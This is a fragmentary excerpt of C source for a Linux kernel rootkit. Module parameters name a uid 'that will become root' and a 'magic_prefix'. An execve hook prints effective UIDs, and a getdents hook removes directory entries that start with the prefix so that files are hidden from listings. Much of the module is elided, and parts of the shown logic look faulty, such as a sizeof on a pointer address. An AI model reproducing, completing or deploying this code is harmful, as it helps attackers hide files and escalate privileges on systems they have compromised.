...
MODULE_PARM_DESC(root_uid, "uid that will become root");
...
MODULE_PARM_DESC(magic_prefix, "prefix of filename");

static const int IS_SAME_STRING = 0;
/*
...
asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[])
{
  ...
  printk(KERN_INFO "Effective UID %d", cred->euid);
...
bool hasPrefix(const char *prefix, const char *string) {
  size_t length_prefix = strlen(prefix);
  size_t length_string = strlen(string);

  if(length_string < length_prefix) {
    return false;
  }
  
  if(strncmp(prefix, string, length_prefix) == IS_SAME_STRING) {
    return true;
  }
...
asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  ...
  // call original function to get number read
  ...
  struct linux_dirent  *prev_dirp;
  
  for(bpos = 0; bpos < nread;) {
    struct linux_dirent *cur_dirp = (struct linux_dirent *)(buffer + bpos);
    struct linux_dirent *next_dirp = (struct linux_dirent *)(buffer + bpos + cur_dirp->d_reclen);
    struct linux_dirent  *new_dirp;

    if(hasPrefix(magic_prefix, cur_dirp->d_name)) {
      nread -= cur_dirp->d_reclen; // for any directory entry with same prefix
      
      if(bpos == 0) { //when its first directory
        copy_to_user(cur_dirp, next_dirp, nread);
        
        buffer = (char *)dirp;
      }
      else { // when its middle or last directory entry
        bpos += cur_dirp->d_reclen;
        new_dirp = kmalloc(prev_dirp->d_reclen, GFP_USER);
        
        copy_from_user(new_dirp, prev_dirp, prev_dirp->d_reclen);
       
        prev_dirp->d_reclen += cur_dirp->d_reclen;
        
        copy_to_user(prev_dirp, new_dirp, sizeof(&new_dirp));
        kfree(new_dirp);
      }
    }
    else {
  ...
  //Return result of the original syscall
  return nread;
}
